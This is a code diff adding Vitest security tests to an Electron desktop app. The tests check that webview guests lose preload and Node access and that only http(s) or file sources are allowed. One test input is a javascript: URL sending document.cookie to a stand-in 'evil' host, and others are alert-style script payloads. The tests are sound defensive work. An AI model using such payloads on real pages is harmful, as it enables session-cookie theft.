@@ -1,4 +1,5 @@
 import assert from 'node:assert/strict'
+import { readFileSync } from 'node:fs'
 
 import { test } from 'vitest'
 
@@ -6,7 +7,9 @@ import {
   buildSessionWindowUrl,
   chatWindowWebPreferences,
   createSessionWindowRegistry,
-  instanceWindowBounds
+  instanceWindowBounds,
+  isAllowedWebviewSrc,
+  sanitizeWebviewAttach
 } from './session-windows'
 
 // A minimal fake BrowserWindow: tracks listeners + destroyed state and lets a
@@ -207,4 +210,82 @@ test('chatWindowWebPreferences passes the preload path through and keeps the har
   assert.equal(prefs.contextIsolation, true)
   assert.equal(prefs.sandbox, true)
   assert.equal(prefs.nodeIntegration, false)
+})
+
+test('sanitizeWebviewAttach strips the preload and any Node access from a guest', () => {
+  // The chat windows enable webviewTag for the preview pane, so a <webview> is
+  // attachable from renderer-authored DOM (a tool result, a prompt-injected
+  // answer, markdown XSS). Left alone, `preload` would hand the guest the whole
+  // hermesDesktop bridge — terminal spawn, fs read/write, git, openExternal.
+  const webPreferences: any = {
+    preload: '/app/preload.cjs',
+    preloadURL: 'file:///app/preload.cjs',
+    nodeIntegration: true,
+    nodeIntegrationInSubFrames: true,
+    contextIsolation: false,
+    sandbox: false
+  }
+  const params: any = {
+    src: 'http://127.0.0.1:5173/',
+    preload: 'file:///app/preload.cjs',
+    nodeintegration: 'on',
+    nodeintegrationinsubframes: 'on',
+    allowpopups: 'on'
+  }
+
+  assert.equal(sanitizeWebviewAttach(webPreferences, params), true, 'an http src is still allowed to attach')
+
+  assert.equal('preload' in webPreferences, false)
+  assert.equal('preloadURL' in webPreferences, false)
+  assert.equal(webPreferences.nodeIntegration, false)
+  assert.equal(webPreferences.nodeIntegrationInSubFrames, false)
+  assert.equal(webPreferences.contextIsolation, true)
+  assert.equal(webPreferences.sandbox, true)
+
+  // The element attributes are re-parsed for the guest, so clearing
+  // webPreferences alone would not be enough.
+  assert.equal('preload' in params, false)
+  assert.equal('nodeintegration' in params, false)
+  assert.equal('nodeintegrationinsubframes' in params, false)
+  assert.equal('allowpopups' in params, false)
+})
+
+test('sanitizeWebviewAttach rejects a src outside the preview allowlist but still scrubs it', () => {
+  const webPreferences: any = { preload: '/app/preload.cjs', nodeIntegration: true }
+  const params: any = { src: 'javascript:fetch("http://evil/"+document.cookie)' }
+
+  assert.equal(sanitizeWebviewAttach(webPreferences, params), false)
+  // Denial and scrubbing are independent: the caller preventDefault()s on false,
+  // but the guest is defanged either way.
+  assert.equal('preload' in webPreferences, false)
+  assert.equal(webPreferences.nodeIntegration, false)
+})
+
+test('isAllowedWebviewSrc admits only the schemes the preview pane actually loads', () => {
+  // src/lib/local-preview.ts normalizes every preview target to an http(s) dev
+  // server URL or a file:// URL — nothing else is a guest we meant to open.
+  assert.equal(isAllowedWebviewSrc('http://127.0.0.1:5173/'), true)
+  assert.equal(isAllowedWebviewSrc('https://example.test/app'), true)
+  assert.equal(isAllowedWebviewSrc('file:///tmp/report.html'), true)
+
+  assert.equal(isAllowedWebviewSrc('javascript:alert(1)'), false)
+  assert.equal(isAllowedWebviewSrc('data:text/html,<script>alert(1)</script>'), false)
+  assert.equal(isAllowedWebviewSrc('hermes://open/session'), false)
+  assert.equal(isAllowedWebviewSrc('chrome://settings'), false)
+  assert.equal(isAllowedWebviewSrc('not a url'), false)
+  assert.equal(isAllowedWebviewSrc(''), false)
+  assert.equal(isAllowedWebviewSrc(undefined), false)
+})
+
+test('main registers the webview attach guard app-wide, not per-window', () => {
+  // The guard has to cover EVERY WebContents (guests included, plus any future
+  // window that forgets chatWindowWebPreferences), so it hangs off
+  // app.on('web-contents-created') rather than wireCommonWindowHandlers. main.ts
+  // is the Electron entry and can't be imported in a node test env, so this is a
+  // source-level assertion — the behaviour above is what's really pinned.
+  const main = readFileSync(new URL('./main.ts', import.meta.url), 'utf8')
+
+  assert.match(main, /app\.on\('web-contents-created'/)
+  assert.match(main, /'will-attach-webview'/)
+  assert.match(main, /sanitizeWebviewAttach\(webPreferences, params\)/)
 })
